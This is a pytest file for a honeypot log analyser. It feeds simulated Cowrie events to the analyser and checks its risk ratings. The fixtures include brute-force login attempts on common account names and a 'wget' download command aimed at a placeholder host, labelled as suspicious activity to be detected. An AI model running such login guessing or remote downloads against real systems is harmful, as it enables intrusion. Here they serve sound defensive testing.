import json
import subprocess
import sys
from pathlib import Path


PROJECT_DIR = Path.home() / "adaptive-honeypot"
ANALYSER = PROJECT_DIR / "src" / "attack_analysis.py"


def test_high_risk_activity_is_detected(tmp_path):
    log_file = tmp_path / "test_events.json"

    events = []

    # Simulate repeated failed login attempts.
    for username in ["root", "admin", "test", "guest", "ubuntu"]:
        events.append({
            "eventid": "cowrie.login.failed",
            "src_ip": "192.0.2.10",
            "username": username
        })

    # Simulate suspicious commands.
    events.extend([
        {
            "eventid": "cowrie.command.input",
            "src_ip": "192.0.2.10",
            "input": "whoami"
        },
        {
            "eventid": "cowrie.command.input",
            "src_ip": "192.0.2.10",
            "input": "wget example.invalid/file"
        }
    ])

    with log_file.open("w", encoding="utf-8") as file:
        for event in events:
            file.write(json.dumps(event) + "\n")

    result = subprocess.run(
        [sys.executable, str(ANALYSER), str(log_file)],
        capture_output=True,
        text=True,
        timeout=30
    )

    assert result.returncode == 0, result.stderr
    assert "HIGH" in result.stdout
    assert "Repeated failed logins" in result.stdout
    assert "download attempt" in result.stdout
    assert (PROJECT_DIR / "reports" / "attack_analysis_test.csv").exists()
def test_low_risk_activity_is_not_high_risk(tmp_path):
    log_file = tmp_path / "low_risk_events.json"

    events = [
        {
            "eventid": "cowrie.command.input",
            "src_ip": "192.0.2.20",
            "input": "ls"
        },
        {
            "eventid": "cowrie.session.connect",
            "src_ip": "192.0.2.20"
        }
    ]

    with log_file.open("w", encoding="utf-8") as file:
        for event in events:
            file.write(json.dumps(event) + "\n")

    result = subprocess.run(
        [sys.executable, str(ANALYSER), str(log_file)],
        capture_output=True,
        text=True,
        timeout=30
    )

    assert result.returncode == 0, result.stderr
    assert "192.0.2.20 | 0/100 | LOW" in result.stdout
def test_invalid_json_line_is_skipped(tmp_path):
    log_file = tmp_path / "malformed_events.json"

    with log_file.open("w", encoding="utf-8") as file:
        file.write('{"eventid":"cowrie.session.connect",'
                   '"src_ip":"192.0.2.30"}\n')
        file.write('THIS IS NOT VALID JSON\n')

    result = subprocess.run(
        [sys.executable, str(ANALYSER), str(log_file)],
        capture_output=True,
        text=True,
        timeout=30
    )

    assert result.returncode == 0, result.stderr
    assert "Warning: skipped invalid JSON on line 2" in result.stdout
    assert "Events examined: 1" in result.stdout
